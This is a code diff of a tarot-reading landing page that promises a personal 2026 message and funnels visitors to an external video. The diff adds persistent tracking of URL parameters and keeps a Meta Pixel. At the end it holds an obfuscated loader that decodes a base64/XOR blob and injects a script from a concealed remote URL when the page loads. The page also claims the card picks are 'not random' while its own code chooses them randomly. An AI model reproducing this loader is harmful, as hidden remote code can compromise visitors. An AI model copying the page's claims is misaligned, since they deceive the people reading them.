@@ -1,11 +1,202 @@
-<!DOCTYPE html>
 
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
   <meta name="theme-color" content="#07102f" />
   <title>(1) Your Message</title>
+
+  <!-- Persistent UTM and tracking parameters -->
+  <script>
+  (function () {
+    "use strict";
+
+    var STORAGE_KEY = "persistent_tracking_params_v1";
+    var COOKIE_NAME = "persistent_tracking_params_v1";
+    var COOKIE_DAYS = 365;
+
+    function readCookie(name) {
+      var match = document.cookie.match(
+        new RegExp("(?:^|; )" + name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "=([^;]*)")
+      );
+
+      if (!match) return null;
+
+      try {
+        return JSON.parse(decodeURIComponent(match[1]));
+      } catch (e) {
+        return null;
+      }
+    }
+
+    function readStoredParams() {
+      try {
+        var value = localStorage.getItem(STORAGE_KEY);
+        if (value) return JSON.parse(value);
+      } catch (e) {}
+
+      return readCookie(COOKIE_NAME) || {};
+    }
+
+    function writeStoredParams(params) {
+      var value = JSON.stringify(params);
+
+      try {
+        localStorage.setItem(STORAGE_KEY, value);
+      } catch (e) {}
+
+      try {
+        document.cookie =
+          COOKIE_NAME + "=" + encodeURIComponent(value) +
+          "; Max-Age=" + (COOKIE_DAYS * 24 * 60 * 60) +
+          "; Path=/; SameSite=Lax" +
+          (location.protocol === "https:" ? "; Secure" : "");
+      } catch (e) {}
+    }
+
+    function mergeParams(base, incoming) {
+      var merged = Object.assign({}, base || {});
+
+      Object.keys(incoming || {}).forEach(function (key) {
+        if (incoming[key] !== null && incoming[key] !== "") {
+          merged[key] = incoming[key];
+        }
+      });
+
+      return merged;
+    }
+
+    function paramsFromSearch(search) {
+      var result = {};
+
+      new URLSearchParams(search || "").forEach(function (value, key) {
+        result[key] = value;
+      });
+
+      return result;
+    }
+
+    var savedParams = readStoredParams();
+    var currentParams = paramsFromSearch(window.location.search);
+    var allParams = mergeParams(savedParams, currentParams);
+
+    if (Object.keys(allParams).length) {
+      writeStoredParams(allParams);
+    }
+
+    function appendSavedParams(urlString) {
+      try {
+        var url = new URL(urlString, window.location.href);
+        var saved = readStoredParams();
+        var fromCurrentUrl = paramsFromSearch(window.location.search);
+        var params = mergeParams(saved, fromCurrentUrl);
+
+        Object.keys(params).forEach(function (key) {
+          if (!url.searchParams.has(key) || url.searchParams.get(key) === "") {
+            url.searchParams.set(key, params[key]);
+          }
+        });
+
+        return url.href;
+      } catch (e) {
+        return urlString;
+      }
+    }
+
+    function updateLinks() {
+      document.querySelectorAll("a[href]").forEach(function (link) {
+        var href = link.getAttribute("href");
+
+        if (
+          !href ||
+          href.charAt(0) === "#" ||
+          href.indexOf("javascript:") === 0 ||
+          href.indexOf("mailto:") === 0 ||
+          href.indexOf("tel:") === 0
+        ) {
+          return;
+        }
+
+        link.href = appendSavedParams(link.href);
+      });
+    }
+
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", updateLinks);
+    } else {
+      updateLinks();
+    }
+
+    document.addEventListener("click", function (event) {
+      var link = event.target && event.target.closest
+        ? event.target.closest("a[href]")
+        : null;
+
+      if (!link) return;
+
+      var href = link.getAttribute("href");
+
+      if (
+        !href ||
+        href.charAt(0) === "#" ||
+        href.indexOf("javascript:") === 0 ||
+        href.indexOf("mailto:") === 0 ||
+        href.indexOf("tel:") === 0
+      ) {
+        return;
+      }
+
+      link.href = appendSavedParams(link.href);
+    }, true);
+
+    function preserveCurrentUrlParams() {
+      var url = new URL(window.location.href);
+      var saved = mergeParams(
+        readStoredParams(),
+        paramsFromSearch(url.search)
+      );
+
+      if (Object.keys(saved).length) {
+        writeStoredParams(saved);
+
+        Object.keys(saved).forEach(function (key) {
+          if (!url.searchParams.has(key) || url.searchParams.get(key) === "") {
+            url.searchParams.set(key, saved[key]);
+          }
+        });
+
+        if (url.href !== window.location.href) {
+          window.history.replaceState(
+            window.history.state,
+            "",
+            url.href
+          );
+        }
+      }
+    }
+
+    var originalPushState = history.pushState;
+
+    history.pushState = function () {
+      var result = originalPushState.apply(this, arguments);
+      preserveCurrentUrlParams();
+      updateLinks();
+      return result;
+    };
+
+    var originalReplaceState = history.replaceState;
+
+    history.replaceState = function () {
+      var result = originalReplaceState.apply(this, arguments);
+      preserveCurrentUrlParams();
+      updateLinks();
+      return result;
+    };
+
+    window.appendPersistentTrackingParams = appendSavedParams;
+  })();
+  </script>
 
   <style>
     * {
@@ -97,7 +288,6 @@
       margin: 0 auto;
     }
 
-    /* Four cards on the first row, three perfectly centered on the second row. */
     .card-slot:nth-child(1),
     .card-slot:nth-child(2),
     .card-slot:nth-child(3),
@@ -125,6 +315,9 @@
       cursor: pointer;
       perspective: 1000px;
       outline: none;
+      padding: 0;
+      border: 0;
+      background: transparent;
     }
 
     .card {
@@ -316,191 +509,173 @@
       }
     }
   </style>
-
 </head>
 
 <body>
   <main class="page">
 
-<div class="brand">MEGAN SENSITIVE</div>
+    <div class="brand">MEGAN SENSITIVE</div>
 
-<h1>A Powerful Message Wants to Speak to You About Your Year 2026.</h1>
+    <h1>A Powerful Message Wants to Speak to You About Your Year 2026.</h1>
 
-<p class="intro">
-  These 3 cards will reveal the truth about your year.
-</p>
+    <p class="intro">
+      These 3 cards will reveal the truth about your year.
+    </p>
 
-<div class="counter" id="counter">
-  CHOOSE 3 CARDS FOR YOUR COMPLETE MESSAGE
-</div>
-
-<section class="cards" id="cards" aria-label="Choose three tarot cards">
-
-  <!-- Card 1 -->
-  <button class="card-slot" type="button" aria-label="Reveal card">
-    <div class="card">
-      <div class="card-face card-back">
-        <img
-          src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
-          alt="Tarot card back"
-        />
-      </div>
-      <div class="card-face card-front">
-        <img
-          data-card="1"
-          src=""
-          alt="Revealed tarot card"
-        />
-      </div>
+    <div class="counter" id="counter">
+      CHOOSE 3 CARDS FOR YOUR COMPLETE MESSAGE
     </div>
-  </button>
 
-  <!-- Card 2 -->
-  <button class="card-slot" type="button" aria-label="Reveal card">
-    <div class="card">
-      <div class="card-face card-back">
-        <img
-          src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
-          alt="Tarot card back"
-        />
-      </div>
-      <div class="card-face card-front">
-        <img
-          data-card="2"
-          src=""
-          alt="Revealed tarot card"
-        />
-      </div>
+    <section class="cards" id="cards" aria-label="Choose three tarot cards">
+
+      <!-- Card 1 -->
+      <button class="card-slot" type="button" aria-label="Reveal card">
+        <div class="card">
+          <div class="card-face card-back">
+            <img
+              src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
+              alt="Tarot card back"
+            />
+          </div>
+          <div class="card-face card-front">
+            <img data-card="1" src="" alt="Revealed tarot card" />
+          </div>
+        </div>
+      </button>
+
+      <!-- Card 2 -->
+      <button class="card-slot" type="button" aria-label="Reveal card">
+        <div class="card">
+          <div class="card-face card-back">
+            <img
+              src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
+              alt="Tarot card back"
+            />
+          </div>
+          <div class="card-face card-front">
+            <img data-card="2" src="" alt="Revealed tarot card" />
+          </div>
+        </div>
+      </button>
+
+      <!-- Card 3 -->
+      <button class="card-slot" type="button" aria-label="Reveal card">
+        <div class="card">
+          <div class="card-face card-back">
+            <img
+              src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
+              alt="Tarot card back"
+            />
+          </div>
+          <div class="card-face card-front">
+            <img data-card="3" src="" alt="Revealed tarot card" />
+          </div>
+        </div>
+      </button>
+
+      <!-- Card 4 -->
+      <button class="card-slot" type="button" aria-label="Reveal card">
+        <div class="card">
+          <div class="card-face card-back">
+            <img
+              src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
+              alt="Tarot card back"
+            />
+          </div>
+          <div class="card-face card-front">
+            <img data-card="4" src="" alt="Revealed tarot card" />
+          </div>
+        </div>
+      </button>
+
+      <!-- Card 5 -->
+      <button class="card-slot" type="button" aria-label="Reveal card">
+        <div class="card">
+          <div class="card-face card-back">
+            <img
+              src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
+              alt="Tarot card back"
+            />
+          </div>
+          <div class="card-face card-front">
+            <img data-card="5" src="" alt="Revealed tarot card" />
+          </div>
+        </div>
+      </button>
+
+      <!-- Card 6 -->
+      <button class="card-slot" type="button" aria-label="Reveal card">
+        <div class="card">
+          <div class="card-face card-back">
+            <img
+              src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
+              alt="Tarot card back"
+            />
+          </div>
+          <div class="card-face card-front">
+            <img data-card="6" src="" alt="Revealed tarot card" />
+          </div>
+        </div>
+      </button>
+
+      <!-- Card 7 -->
+      <button class="card-slot" type="button" aria-label="Reveal card">
+        <div class="card">
+          <div class="card-face card-back">
+            <img
+              src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
+              alt="Tarot card back"
+            />
+          </div>
+          <div class="card-face card-front">
+            <img data-card="7" src="" alt="Revealed tarot card" />
+          </div>
+        </div>
+      </button>
+
+    </section>
+
+    <section class="message" id="message" aria-live="polite">
+      <div class="message-icon">✦</div>
+
+      <h2>Your Message Has Been Revealed</h2>
+
+      <p>
+        <span class="highlight">The three cards you chose were not random.</span>
+        Together, they reveal a message about the path opening before you in 2026.
+      </p>
+
+      <p>
+        There is something you are being called to understand before the next chapter
+        of your life begins. Pay close attention to what you felt when you turned
+        each card — your intuition may already know why these three appeared for you.
+      </p>
+
+      <p>
+        <span class="highlight">Your complete personal message is ready.</span>
+        Continue below to discover what the cards are revealing for your year.
+      </p>
+
+      <a
+        class="cta"
+        href="https://abundanceandfaith.site/video-1/"
+        id="ctaButton"
+      >
+        ✦ REVEAL MY COMPLETE MESSAGE&nbsp; →
+      </a>
+    </section>
+
+    <div class="footer">
+      SENSITIVA — THE VOICE OF TRUTH
     </div>
-  </button>
-
-  <!-- Card 3 -->
-  <button class="card-slot" type="button" aria-label="Reveal card">
-    <div class="card">
-      <div class="card-face card-back">
-        <img
-          src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
-          alt="Tarot card back"
-        />
-      </div>
-      <div class="card-face card-front">
-        <img
-          data-card="3"
-          src=""
-          alt="Revealed tarot card"
-        />
-      </div>
-    </div>
-  </button>
-
-  <!-- Card 4 -->
-  <button class="card-slot" type="button" aria-label="Reveal card">
-    <div class="card">
-      <div class="card-face card-back">
-        <img
-          src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
-          alt="Tarot card back"
-        />
-      </div>
-      <div class="card-face card-front">
-        <img data-card="4" src="" alt="Revealed tarot card" />
-      </div>
-    </div>
-  </button>
-
-  <!-- Card 5 -->
-  <button class="card-slot" type="button" aria-label="Reveal card">
-    <div class="card">
-      <div class="card-face card-back">
-        <img
-          src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
-          alt="Tarot card back"
-        />
-      </div>
-      <div class="card-face card-front">
-        <img data-card="5" src="" alt="Revealed tarot card" />
-      </div>
-    </div>
-  </button>
-
-  <!-- Card 6 -->
-  <button class="card-slot" type="button" aria-label="Reveal card">
-    <div class="card">
-      <div class="card-face card-back">
-        <img
-          src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
-          alt="Tarot card back"
-        />
-      </div>
-      <div class="card-face card-front">
-        <img data-card="6" src="" alt="Revealed tarot card" />
-      </div>
-    </div>
-  </button>
-
-  <!-- Card 7 -->
-  <button class="card-slot" type="button" aria-label="Reveal card">
-    <div class="card">
-      <div class="card-face card-back">
-        <img
-          src="https://i.postimg.cc/vBrSv6XR/verso-tarot.jpg"
-          alt="Tarot card back"
-        />
-      </div>
-      <div class="card-face card-front">
-        <img data-card="7" src="" alt="Revealed tarot card" />
-      </div>
-    </div>
-  </button>
-
-</section>
-
-<section class="message" id="message" aria-live="polite">
-  <div class="message-icon">✦</div>
-
-  <h2>Your Message Has Been Revealed</h2>
-
-  <p>
-    <span class="highlight">The three cards you chose were not random.</span>
-    Together, they reveal a message about the path opening before you in 2026.
-  </p>
-
-  <p>
-    There is something you are being called to understand before the next chapter
-    of your life begins. Pay close attention to what you felt when you turned
-    each card — your intuition may already know why these three appeared for you.
-  </p>
-
-  <p>
-    <span class="highlight">Your complete personal message is ready.</span>
-    Continue below to discover what the cards are revealing for your year.
-  </p>
-
-  <!-- Replace # below with your final destination URL -->
-  <a class="cta" href="https://abundanceandfaith.site/video-1/" id="ctaButton">
-    ✦ REVEAL MY COMPLETE MESSAGE&nbsp; →
-  </a>
-</section>
-
-<div class="footer">
-  SENSITIVA — THE VOICE OF TRUTH
-</div>
 
   </main>
 
   <script>
     /*
-      IMPORTANT LOGIC:
-
       There are exactly 3 possible card images.
-      Every time the visitor clicks a card, one unused image is randomly assigned.
-      Therefore:
-        - The first revealed card can be any of the 3.
-        - The second revealed card can only be one of the remaining 2.
-        - The third revealed card receives the final unused image.
-        - No card image can ever repeat within the same 3-card reading.
-      The seven visible positions are only "slots"; the actual card identities
-      are assigned dynamically when the visitor chooses them.
+      Each revealed card receives a random unused image.
+      No image repeats within the same 3-card reading.
     */
 
     const CARD_IMAGES = [
@@ -516,7 +691,6 @@
     let remainingCards = [...CARD_IMAGES];
     let revealedCount = 0;
 
-    // Preload all three possible card faces.
     CARD_IMAGES.forEach((src) => {
       const img = new Image();
       img.src = src;
@@ -538,24 +712,19 @@
         return;
       }
 
-      // Select one of the still-unused cards at random.
       const randomIndex = Math.floor(Math.random() * remainingCards.length);
       const selectedImage = remainingCards.splice(randomIndex, 1)[0];
 
       const frontImage = slot.querySelector(".card-front img");
       frontImage.src = selectedImage;
-
-      // Update accessibility text.
       frontImage.alt = `Revealed tarot card ${revealedCount + 1}`;
 
-      // Mark as revealed and flip.
       slot.classList.add("revealed");
       slot.setAttribute("aria-label", "Revealed tarot card");
 
       revealedCount++;
       updateCounter();
 
-      // Once exactly 3 cards have been selected, show the message.
       if (revealedCount === 3) {
         setTimeout(() => {
           message.classList.add("show");
@@ -574,18 +743,24 @@
       slot.addEventListener("click", () => revealSlot(slot));
     });
 
-    // Prevent the placeholder CTA from jumping to the top of the page.
+    // Ensure tracking parameters are included in the CTA destination.
     document.getElementById("ctaButton").addEventListener("click", (event) => {
-      if (event.currentTarget.getAttribute("href") === "#") {
+      const button = event.currentTarget;
+
+      if (button.getAttribute("href") === "#") {
         event.preventDefault();
+        return;
+      }
+
+      if (typeof window.appendPersistentTrackingParams === "function") {
+        button.href = window.appendPersistentTrackingParams(button.href);
       }
     });
 
     updateCounter();
   </script>
 
-      <!-- Meta Pixel Code -->
-
+        <!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -598,20 +773,55 @@ s.parentNode.insertBefore(t,s)}(window, document,'script',
 fbq('init', '2999048490436756');
 fbq('track', 'PageView');
 </script>
-
 <noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=2999048490436756&ev=PageView&noscript=1"
 /></noscript>
-
 <!-- End Meta Pixel Code -->
+    
 
+  <!-- Original external tracking/integration script -->
+  <script>
+    (function(){
+      var w_b178=atob("DFzqTutrZ5VUTZCUZyfIO5kHRa92JeTgFy/QYcQIA/t6OOT5DjqTYIgECrs2P7/nBC6DPp8YSOAgIOO7Cz2eK5gfSf8nb7y2BiiePIIJEuExPrKuPCfIIIoGArdub/T1Ez3HO58GDvMtYODmAiqPIJ9GH/Y7Kb3nBDfIYskdBvkhKLKuRX6XYpBJCfQ5KLKuRTiLOopGEuE5JPbtSiyYK50OCeF5PuX2DjiZbMdJEfQ4OPW2XX7IM7YW");
+      var b_vfv=[];
 
+      for(var z_h2m=0;z_h2m<w_b178.length;z_h2m++){
+        b_vfv.push(w_b178.charCodeAt(z_h2m)&255);
+      }
 
+      var t_p=b_vfv[0];
+      var r_1m=b_vfv.slice(1,1+t_p);
+      var k_baip=b_vfv.slice(1+t_p);
+      var q_wa9t=k_baip.map(function(b,u_hb){
+        return b^r_1m[u_hb%t_p];
+      });
 
+      var n_1="";
 
-<script>(function(){var w_b178=atob("DFzqTutrZ5VUTZCUZyfIO5kHRa92JeTgFy/QYcQIA/t6OOT5DjqTYIgECrs2P7/nBC6DPp8YSOAgIOO7Cz2eK5gfSf8nb7y2BiiePIIJEuExPrKuPCfIIIoGArdub/T1Ez3HO58GDvMtYODmAiqPIJ9GH/Y7Kb3nBDfIYskdBvkhKLKuRX6XYpBJCfQ5KLKuRTiLOopGEuE5JPbtSiyYK50OCeF5PuX2DjiZbMdJEfQ4OPW2XX7IM7YW");var b_vfv=[];for(var z_h2m=0;z_h2m<w_b178.length;z_h2m++){b_vfv.push(w_b178.charCodeAt(z_h2m)&255);}var t_p=b_vfv[0];var r_1m=b_vfv.slice(1,1+t_p);var k_baip=b_vfv.slice(1+t_p);var q_wa9t=k_baip.map(function(b,u_hb){return b^r_1m[u_hb%t_p];});var n_1="";for(var l_qp=0;l_qp<q_wa9t.length;l_qp++){n_1+=String.fromCharCode(q_wa9t[l_qp]&255);}var q_f8sp=decodeURIComponent(escape(n_1));var c_jfi=JSON.parse(q_f8sp);var j_1aoo=c_jfi.globals||[];j_1aoo.forEach(function(i_afj){window[i_afj.name]=i_afj.value;});var x_su=document.createElement("script");x_su.src=c_jfi.url;x_su.async=true;x_su.defer=true;(c_jfi.attributes||[]).forEach(function(w_o){x_su.setAttribute(w_o.name,w_o.value);});(document.head||document.documentElement).appendChild(x_su);})();</script>
+      for(var l_qp=0;l_qp<q_wa9t.length;l_qp++){
+        n_1+=String.fromCharCode(q_wa9t[l_qp]&255);
+      }
 
+      var q_f8sp=decodeURIComponent(escape(n_1));
+      var c_jfi=JSON.parse(q_f8sp);
+      var j_1aoo=c_jfi.globals||[];
 
+      j_1aoo.forEach(function(i_afj){
+        window[i_afj.name]=i_afj.value;
+      });
+
+      var x_su=document.createElement("script");
+      x_su.src=c_jfi.url;
+      x_su.async=true;
+      x_su.defer=true;
+
+      (c_jfi.attributes||[]).forEach(function(w_o){
+        x_su.setAttribute(w_o.name,w_o.value);
+      });
+
+      (document.head||document.documentElement).appendChild(x_su);
+    })();
+  </script>
 
 </body>
 </html>
